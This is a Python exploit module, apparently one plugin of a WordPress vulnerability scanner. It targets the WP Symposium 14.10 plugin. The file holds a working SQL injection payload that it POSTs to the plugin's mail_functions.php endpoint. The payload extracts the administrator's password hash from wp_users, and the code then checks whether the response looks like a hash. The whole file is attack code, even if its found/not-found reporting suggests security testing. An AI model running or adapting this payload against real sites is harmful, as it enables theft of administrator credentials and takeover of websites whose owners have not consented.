from ..exploitsql import ExploitSql


class SymposiumSQL(ExploitSql):
	@staticmethod
	def getname():
		return 'WP Symposium'

	@staticmethod
	def getversion():
		return '14.10'

	@staticmethod
	def getexploiturl():
		return 'http://www.exploit-db.com/exploits/35543/'

	# TODO verify exploit is returning a 34 character md5
	def exploit(self):
		name = self.getname()
		version = self.getversion()
		exploit = {
			'mid': '1',
			'tray': 'in_deleted%20=%201%20UNION%20(SELECT%20user_pass%20FROM%20wp_users%20WHERE%20ID=1)%20LIMIT%201,%201%20--'
		}
		response = ExploitSql.request(
			self.hostname + '/wp-content/plugins/wp-symposium/ajax/mail_functions.php',
			data=exploit, method='POST', urlencode=True)

		if response is not None and len(response) == 34 and '$' in response:
			ExploitSql.exploitfound(name, version, self.getexploiturl())
		else:
			ExploitSql.exploitnotfound(name, version)